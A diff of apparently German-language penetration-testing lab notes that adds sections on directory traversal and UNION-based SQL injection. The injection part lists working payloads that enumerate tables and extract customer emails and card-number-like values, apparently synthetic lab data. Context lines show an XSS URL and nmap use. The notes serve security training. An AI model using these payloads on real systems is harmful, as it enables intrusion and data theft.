@@ -38,7 +38,7 @@ nmap -sV --script=banner 192.168.0.5
 
 ### Cross Site Scripting \(XSS\)
 
-![](../.gitbook/assets/image%20%28334%29.png)
+![](../.gitbook/assets/image%20%28339%29.png)
 
 ```text
 # URL / Question 4
@@ -51,7 +51,7 @@ http://10.102.10.178/purchase?id=%3Cscript%3Econsole.log(%22R3fLect3d!%22);%3C/s
 * Globi hat Foto mit Boarding-Pass Code auf Instagram gestellt
 * Analysieren
 
-![](../.gitbook/assets/image%20%28329%29.png)
+![](../.gitbook/assets/image%20%28332%29.png)
 
 ![](../.gitbook/assets/image%20%28326%29.png)
 
@@ -67,7 +67,7 @@ SSI LDN-NYC VEGETARIAN    OSI 30KG, ECONOMY
 
 * Dateien / Bilder auf Metadaten und Inhalt untersuchen
 
-![](../.gitbook/assets/image%20%28333%29.png)
+![](../.gitbook/assets/image%20%28338%29.png)
 
 ### Timestomp
 
@@ -83,7 +83,7 @@ Attackers need to hide their tracks and any prints that they may leave during an
 
 ![](../.gitbook/assets/image%20%28324%29.png)
 
-![](../.gitbook/assets/image%20%28328%29.png)
+![](../.gitbook/assets/image%20%28329%29.png)
 
 ### Hydra Brute Force
 
@@ -210,7 +210,7 @@ pa55w0rd!
 
 ```
 
-![](../.gitbook/assets/image%20%28336%29.png)
+![](../.gitbook/assets/image%20%28341%29.png)
 
 ```text
 root@john:~# john -help
@@ -325,7 +325,7 @@ nmap -sV -v -p- [IP Address]
 
 #### Question 1-2
 
-![](../.gitbook/assets/image%20%28330%29.png)
+![](../.gitbook/assets/image%20%28334%29.png)
 
 ```text
 root@iml-kali:~# nmap 10.102.3.47 --top-ports 1000
@@ -444,7 +444,7 @@ Nmap done: 1 IP address (1 host up) scanned in 157.72 seconds
 
 #### Question 4-5
 
-![](../.gitbook/assets/image%20%28331%29.png)
+![](../.gitbook/assets/image%20%28335%29.png)
 
 ```bash
 root@iml-kali:~# nmap -help
@@ -565,7 +565,9 @@ SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
 
 ```
 
-#### Question 6-8
+#### Questio
+
+#### n 6-8
 
 ![](../.gitbook/assets/image%20%28327%29.png)
 
@@ -621,6 +623,108 @@ PORT    STATE SERVICE
 |_ction>
 
 Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
+
+```
+
+
+
+### Web Applications: Directory Traversal
+
+* Quick Summary
+
+  Directory traversal is a technique that can be used to read files on a web server that were never intended to be accessed. This is usually intruded through insecure coding practices.
+
+```bash
+# Theorie
+URL= scheme: [//authority]path[?query][#fragment]
+URL = https://example.com/home/homepage.html?Language=EN&Country=GB#ContactUs
+
+
+authority = [userinfo@]host[:port]
+authority = example.com
+authority  = user@example.com:443 
+
+
+
+http://<target-ip>/view/?photo=../../etc/token
+```
+
+![](../.gitbook/assets/image%20%28331%29.png)
+
+![](../.gitbook/assets/image%20%28328%29.png)
+
+### SQL-Injection
+
+* Quick Summary
+
+  In SQL, the UNION operator is used to join the results from two or more SELECT statements. Let's take a look at how we can use the UNION operator in SQL injection to enumerate databases and extract data from additional tables and columns. 
+
+```sql
+// Determine vulnerable columns
+
+input' ORDER BY 5 #  
+
+input' UNION SELECT 1,2,3,4,5 #
+
+// Determine the table names
+input' UNION SELECT 1,2,group_concat(table_name),4,5 FROM information_schema.tables WHERE table_schema=database()#
+
+// Determine the column names
+input' UNION SELECT 1,group_concat(column_name, 0x0a),3,4,5 FROM information_schema.columns WHERE table_name="customers"#
+
+# Extract data
+
+
+    
+```
+
+#### Übungen
+
+![](../.gitbook/assets/image%20%28337%29.png)
+
+![](../.gitbook/assets/image%20%28330%29.png)
+
+```sql
+
+// QUESTION 2 + 3
+input' UNION SELECT 1,2,3 #
+// 1 2 3
+
+// QUESTION 4
+input' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()#
+// Private,customer
+
+// QUESTION 5 
+input' UNION SELECT 1,2,group_concat(column_name, 0x0a) FROM information_schema.columns WHERE table_name="customers"#
+// OUTPUT: 1 2 ID ,Firstname ,Lastname ,Email ,PhoneNumber ,CardNum ,ExpDate 
+// => 7
+
+// QUESTION 6
+input' UNION SELECT 1,2,group_concat(Firstname,Lastname,Email) FROM customers #
+/*
+
+1 2 JamesSmithjamessmith@yahoo.none,BobJacobsonbob@myfamily.com,DonaldRuizdruiz2@nasa.gov,SaraWilsonswilson3@merriam-webster.com,StephenRobertsonsrobertson4@soundcloud.com,RoyPhillipsrphillips5@altervista.org,ClarenceMorrisoncmorrison6@unicef.org,DennisHawkinsdhawkins7@dedecms.com,MartinRaymray8@nyu.edu,RubyMorenormoreno9@theglobeandmail.com,RubyJacksonrjacksona@cocolog-nifty.com,ShirleySnyderssnyderb@google.es,RubyGonzalezrgonzalezc@va.gov,AshleyMooreamoored@ifeng.com,DanielReyesdreyese@constantcontact.com,BrianJohnstonbjohnstonf@google.com,PatrickHowellphowellg@so-net.ne.jp,FrankThompsonfthompsonh@cam.ac.uk,LisaMatthewslmatthewsi@wsj.com,ErnestJonesejonesj@amazon.de,TammyFranklintfranklink@hugedomains.com,MarthaDeanmdeanl@dailymotion.com,BobbyMccoybmccoym@bandcamp.com,HeatherPetershpetersn@cam.ac.uk,DonaldWashingtondwashingtono@salon.com,JasonMurphyjmurphyp@etsy.com,DeborahGreendgreenq@example.com,WandaRileywrileyr@discovery.com,ElizabethGrayegrays@google.pl,GaryElliottgelliottt@woothemes.com,DianeWatsondwatson
+*/
+
+// QUESTION 7
+input' UNION SELECT 1,2,group_concat(Firstname,Lastname,CardNum) FROM customers WHERE Lastname LIKE '%Parker%' #
+/*
+1 2 JamesSmith4501980056438574,BobJacobson5259235848204827,DonaldRuiz4905705127472540595,SaraWilson30112800189471,StephenRobertson6763546601190080898,RoyPhillips4405752033277442,ClarenceMorrison3584028834420084,DennisHawkins201456225786053,MartinRay5100143991646296,RubyMoreno5010122475689369,RubyJackson36130151590943,ShirleySnyder3580416488626169,RubyGonzalez561012227694083219,AshleyMoore4026304507123758,DanielReyes6391613636975926,BrianJohnston5504355547464766,PatrickHowell4017954694806630,FrankThompson3588326418798776,LisaMatthews5602259698965814,ErnestJones5108754446787592,TammyFranklin4936229683218651,MarthaDean3587552401543983,BobbyMccoy3569358378765878,HeatherPeters30384766008934,DonaldWashington6767155302810579,JasonMurphy560222013145149686,DeborahGreen3576791778733610,WandaRiley3574406747287166,ElizabethGray4175003317132947,GaryElliott3564685811963867,DianeWatson346855984553719,StevenRoss3532439225076158,KathleenMontgomery3560486740608333,AntonioBailey30315556601777,SaraMarshall3544008755783966,GeorgeAndr
+*/
+
+
+// QUESTION 8
+// Get columns of 'Private' first
+input' UNION SELECT 1,2,group_concat(column_name, 0x0a) FROM information_schema.columns WHERE table_name="Private"#
+//1 2 id ,company ,contact ,currency ,balanceowed ,location ,username
+
+// Get company name 
+input' UNION SELECT 1,2,group_concat(company,contact) FROM Private WHERE contact LIKE '%Walker%' #
+1 2 AiboxJanet Walker
+
+// QUESTION 9
+input' UNION SELECT 1,2,group_concat(contact, currency, balanceowed) FROM Private WHERE contact LIKE '%Ray%' #
+1 2 Jeremy RayYuan Renminbi$5.24
 
 ```
 
